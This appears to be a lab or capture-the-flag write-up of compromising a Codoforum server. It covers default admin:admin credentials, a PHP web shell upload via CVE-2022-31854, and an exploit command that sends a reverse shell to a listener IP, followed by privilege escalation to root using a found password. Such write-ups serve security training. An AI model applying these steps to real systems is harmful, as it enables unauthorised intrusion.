Navigating to port 80/HTTP we have this **Codoforum** web page

However there is an information disclosure of the username on this page know as **admin**


```markdown
Hi,

This is an example post in your codoforum installation.  
You can create/modify/delete all forum categories from the forum backend.

Please edit the forum title and description from the backend.

The only user available to login in the front-end is **admin** with the password that you set during the installation..........
```


trying out default credentials on the logon page, we where able to login as user **admin** with password **admin** also

Navigating to the profile edit section of this page, we are able to upload an image


![](https://i.imgur.com/4rBfd90.png)


However uploading a `shell.php` file we get this error message



![](https://i.imgur.com/phq7Qpp.png)


After several uploads found an exploit for this on `CVE-2022-31854`, which you can download from [here](https://github.com/Vikaran101/CVE-2022-31854)



![](https://i.imgur.com/oC4GpU5.png)


Running the exploit i get a **Connection refused** error, :p, as we can see the connection is made to `/admin/?page=login` endpoint, for some reasons, things are not working

```bash
python3 exploit.py --target-url 'http://192.168.153.23' --username admin --password admin --listener-ip 192.168.45.203 --port 4444 
```


![](https://i.imgur.com/bMEHppK.png)


Decided to run a directory bruteforce attack and found the `/admin` endpoint



![](https://i.imgur.com/mQFsrat.png)


Navigating there same username and password we used earlier worked!! `admin:admin`

![](https://i.imgur.com/5kDHp35.png)


According to the exploit, navigating to this directory, i saw another upload function `/admin/index.php?page=config`


![](https://i.imgur.com/N5orXIP.png)



Uploaded my `shell.php` file and according to the exploit navigated to `/sites/default/assets/img/attachments/shell.php` and truly i got my web shell, haha ðŸ™ƒ



![](https://i.imgur.com/bKCHWht.png)


Then got an actual shell on my listener as user `www-data`

![](https://i.imgur.com/GSer3yN.png)


Running `linpeas.sh` i found a password called `FatPanda123` 



![](https://i.imgur.com/KGSUAha.png)


Fortunately, this password didn't work for the user `offsec` but worked for the the user `root` ðŸ˜Ž
